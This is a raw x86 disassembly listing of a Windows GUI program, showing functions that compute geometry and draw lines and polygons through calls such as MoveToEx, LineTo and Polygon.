pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45fe0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov [ ebp - 0x8 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov esi eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call MoveToEx
mov [ ebp - 0x8 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call LineTo
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45fe84
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ esp + 0x18 ]
mov edx esi
mov eax ebx
call sub_45cd18
mov eax [ esp + 0x18 ]
mov [ esp ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ esi + 0xc ]
mov eax ebx
call sub_45cd18
mov eax [ esp + 0x18 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0x18 ]
lea edx [ esi + 0x18 ]
mov eax ebx
call sub_45cd18
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x10 ]
call sub_41d72c
cmp al 0x1
je r-xdata
push 0x3
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Polygon
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ edi ]
mov eax [ ebx + 0x10 ]
call sub_41d618
sub_45ff1c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push eax
push esi
mov ecx [ edx ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_45cd60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
push esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_45cd60
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push esi
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_45cd60
push 0x3
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Polygon
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45ff88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
fld [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
fld [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x20 ]
faddp st1
call sub_402990
mov [ ebx ] eax
mov eax [ ebp + 0x8 ]
fld [ eax - 0x8 ]
fchs
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
fld [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x10 ]
faddp st1
call sub_402990
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_45cd0c
pop ebx
pop ebp
retn
sub_45ffec
push ebp
mov ebp esp
add esp 0xffffff28
push ebx
push esi
push edi
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x25 ] dl
mov [ ebp - 0x24 ] eax
mov esi [ ebp + 0x14 ]
mov ebx [ esi ]
mov eax [ ebp - 0x2c ]
sub ebx [ eax ]
mov edi [ ebp - 0x2c ]
mov edi [ edi + 0x4 ]
sub edi [ esi + 0x4 ]
mov [ ebp - 0x8c ] ebx
fild [ ebp - 0x8c ]
fmul [ r-xdata ]
mov [ ebp - 0x90 ] ebx
fild [ ebp - 0x90 ]
fmulp st1
mov [ ebp - 0x94 ] edi
fild [ ebp - 0x94 ]
fmul [ r-xdata ]
mov [ ebp - 0x98 ] edi
fild [ ebp - 0x98 ]
fmulp st1
faddp st1
fsqrt
fstp [ ebp - 0x50 ]
fwait
fld [ ebp - 0x50 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
fld [ ebp - 0x50 ]
call sub_402990
mov edx [ ebp + 0xc ]
call sub_46038c
mov [ ebp - 0x8c ] edi
fild [ ebp - 0x8c ]
fdiv [ ebp - 0x50 ]
fstp [ ebp - 0x20 ]
fwait
mov [ ebp - 0x8c ] ebx
fild [ ebp - 0x8c ]
fdiv [ ebp - 0x50 ]
fstp [ ebp - 0x10 ]
fwait
fild [ esi ]
fmul [ ebp - 0x10 ]
fild [ esi + 0x4 ]
fmul [ ebp - 0x20 ]
fsubp st1
fstp [ ebp - 0x40 ]
fwait
fild [ esi ]
fmul [ ebp - 0x20 ]
fild [ esi + 0x4 ]
fmul [ ebp - 0x10 ]
faddp st1
fstp [ ebp - 0x48 ]
fwait
mov [ ebp - 0x8c ] eax
fild [ ebp - 0x8c ]
fsubr [ ebp - 0x40 ]
fstp [ ebp - 0x8 ]
fwait
fild [ ebp - 0x30 ]
fdiv [ r-xdata ]
fsubr [ ebp - 0x48 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_45ff88
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x5c ] eax
fild [ ebp - 0x30 ]
fdiv [ r-xdata ]
fadd [ ebp - 0x48 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_45ff88
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x2c ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x2c ]
mov edx [ edx ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xec ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xec ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
fild [ ebp - 0x30 ]
fdiv [ r-xdata ]
fstp [ ebp - 0x38 ]
fwait
fld [ ebp - 0x48 ]
fsub [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_45ff88
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x6c ] eax
fld [ ebp - 0x48 ]
fadd [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_45ff88
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0x2c ]
fild [ eax ]
fmul [ ebp - 0x10 ]
mov eax [ ebp - 0x2c ]
fild [ eax + 0x4 ]
fmul [ ebp - 0x20 ]
fsubp st1
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x48 ]
fsub [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_45ff88
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x7c ] eax
fld [ ebp - 0x48 ]
fadd [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_45ff88
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x84 ] eax
mov eax [ esi ]
mov [ ebp - 0x58 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x54 ] eax
lea edx [ ebp - 0x58 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_45cd0c
mov eax [ ebp - 0x88 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xd4 ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0xd0 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0x6c ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc0 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0x54 ]
mov [ ebp - 0xb4 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0x78 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x74 ]
mov [ ebp - 0xa4 ] eax
lea edx [ ebp - 0xd8 ]
mov ecx 0x6
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_460350
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_460394
add esp 0xfffffff8
mov ecx [ eax ]
mov [ esp ] ecx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x4 ] ecx
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov [ edx ] eax
mov eax [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
pop ecx
pop edx
retn
sub_4603c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4603ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4603f4
retn
sub_460400
salc
inc edi
add dh dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al bl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46053d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460544
retn
sub_460c14
push ebp
mov ebp esp
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax ebx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f3c
mov eax ebx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f3c
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_460c54
push ebp
mov ebp esp
add esp 0xfffffff8
mov cl 0xe8
mov edx rw-data
sub edx 0x8
inc cl
jne r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp + 0x8 ]
fcomp [ edx ]
fnstsw ax
sahf
jb r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_460c9c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x18
mov esi rw-data
dec ebx
sub esi 0x8
cmp bl 0xff
jne r-xdata
mov eax ebx
jmp r-xdata
fld [ esi ]
fsub [ ebp + 0x8 ]
fabs
fcomp [ rw-data ]
fnstsw ax
sahf
jae r-xdata
mov al 0x19
pop esi
pop ebx
pop ebp
retn 0x8
sub_460ce4
push ebx
push esi
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov esi eax
push ebx
push 0x0
call ReleaseDC
mov eax esi
pop esi
pop ebx
retn
sub_460d08
push ebx
mov ebx eax
cmp [ ebx ] 0x8
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
call sub_460ce4
push eax
push 0x48
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
call MulDiv
neg eax
mov [ ebx ] eax
sub_460d38
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_460d87
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov eax [ ebp - 0x8 ]
call sub_408074
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
call sub_460d08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d8e
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_460d98
push ebx
mov ebx eax
mov edx ebx
mov eax [ rw-data ]
call sub_405af8
mov eax [ ebx ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
mov eax ebx
mov edx [ rw-data ]
add edx 0xb
call sub_40414c
sub_460de4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_460e78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d0a8
mov esi eax
call sub_460d38
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d034
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_460d98
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042f4
jne r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e7f
lea eax [ ebp - 0x8 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41d0e4
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
call sub_41d14c
cmp al 0x1
je r-xdata
mov al 0x1
sub_460e8c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_460f06
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_460d98
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d04c
call sub_460d38
mov edx eax
mov eax ebx
call sub_41d0c4
xor edx edx
mov eax ebx
call sub_41ce24
mov dl [ r-xdata ]
mov eax ebx
call sub_41d0f0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460f0d
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_460f34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_460f9f
push [ fs : edx ]
mov [ fs : edx ] esp
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
cmp eax 0x168
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460fa6
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_460fac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
mov [ ebx + 0x288 ] eax
xor edx edx
mov eax ebx
call sub_42a830
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov edx 0x190
mov eax ebx
call sub_439d2c
mov edx 0xfa
mov eax ebx
call sub_439d50
mov [ ebx + 0x228 ] 0xf
mov [ ebx + 0x28c ] 0x0
mov [ ebx + 0x22c ] 0x1
mov eax [ ebx + 0x208 ]
mov [ ebx + 0x250 ] eax
mov [ ebx + 0x278 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c69c
mov [ ebx + 0x27c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c9f8
mov esi eax
mov [ ebx + 0x288 ] esi
mov edx [ ebx + 0x250 ]
mov eax esi
call sub_45c82c
push 0x4
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x3
mov edx 0x4
mov eax 0x3
call sub_412be0
lea esi [ ebp - 0x14 ]
lea edi [ ebx + 0x258 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebx + 0x270 ] 0x0
mov [ ebx + 0x271 ] 0x1
xor eax eax
mov [ ebx + 0x274 ] eax
push 0xf
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0xf
mov edx 0xf
mov eax 0xf
call sub_412be0
lea esi [ ebp - 0x14 ]
lea edi [ ebx + 0x29e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ax [ ebx + 0x78 ]
mov [ ebx + 0x268 ] ax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x284 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x26c ] eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov [ ebx + 0x28c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
mov [ rw-data ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_461134
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
lea eax [ esi + 0x288 ]
call sub_40d3ac
mov eax [ esi + 0x27c ]
call sub_403198
mov eax [ esi + 0x284 ]
call sub_403198
mov eax [ esi + 0x26c ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4611cc
push ebx
push esi
push edi
add esp 0xffffffe4
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax [ ebx + 0x70 ]
push eax
mov al [ ebx + 0x278 ]
push eax
mov eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x27c ]
mov edx edi
mov eax [ ebx + 0x288 ]
mov esi [ eax ]
call [ esi + 0xa8 ]
push edi
lea esi [ esp + 0x10 ]
lea edi [ ebx + 0x22d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
lea eax [ ebx + 0x22d ]
call sub_45c428
lea esi [ ebx + 0x22d ]
push 0x64
mov eax [ esp + 0xc ]
push eax
mov edx 0x3
mov eax ebx
call sub_461750
push eax
call MulDiv
mov edx [ esi + 0xc ]
sub edx [ ebx + 0x218 ]
sub edx eax
push edx
lea eax [ esp + 0x10 ]
push eax
push 0x64
mov eax [ esp + 0x10 ]
push eax
mov edx 0x2
mov eax ebx
call sub_461750
push eax
call MulDiv
mov edx [ esi + 0x8 ]
sub edx [ ebx + 0x218 ]
sub edx eax
push edx
push 0x64
mov eax [ esp + 0x18 ]
push eax
mov edx 0x1
mov eax ebx
call sub_461750
push eax
call MulDiv
mov edx [ esi + 0x4 ]
add edx [ ebx + 0x218 ]
add eax edx
push eax
push 0x64
mov eax [ esp + 0x18 ]
push eax
xor edx edx
mov eax ebx
call sub_461750
push eax
call MulDiv
mov edx [ esi ]
add edx [ ebx + 0x218 ]
add eax edx
pop edx
pop ecx
call sub_412be0
push edi
lea esi [ esp + 0x10 ]
lea edi [ ebx + 0x28e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax ebx
call sub_4617c4
lea edx [ ebx + 0x22d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax [ esp ]
push eax
mov ecx [ ebx + 0x250 ]
mov edx edi
mov eax [ ebx + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xb4 ]
add esp 0x1c
pop edi
pop esi
pop ebx
retn
sub_461310
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
add esp 0x10
pop ebx
retn
mov eax [ ebx + 0x288 ]
mov edx [ eax ]
call [ edx + 0xb8 ]
test al al
jne r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov ecx esp
mov edx [ ebx + 0x250 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_461354
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
mov esi [ eax + 0x288 ]
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_41d618
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov dl 0x2
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
call sub_41c964
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ esi + 0x10 ]
call sub_41d618
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41d734
mov eax [ esi + 0x10 ]
call sub_41d64c
test bl bl
jne r-xdata
sub_4613ec
push ebx
mov ebx eax
mov eax [ ebx + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax [ ebx + 0x288 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x288 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
sub_461448
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x14 ] ecx
xor ecx ecx
push ebp
push sub_4614cd
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp edx 0x1
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x64
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
jmp r-xdata
cmp edx 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4614d4
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
lea ecx [ eax + 0x228 ]
xchg edx ecx
call sub_461564
sub_4614ec
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ ebx ]
mov edx edi
call sub_4042f4
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx edi
call sub_403f3c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_461514
push ebp
mov ebp esp
push esi
mov esi eax
fld [ edx ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_461590
push ebx
push esi
mov esi edx
mov ebx eax
mov dx [ ebx + 0x268 ]
mov eax ebx
call sub_43a77c
mov eax [ ebx + 0x26c ]
mov [ eax + 0x4 ] 0x0
mov edx esi
mov eax ebx
call sub_43c2b4
pop esi
pop ebx
retn
sub_4615e8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x28c ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x288 ]
test esi esi
je r-xdata
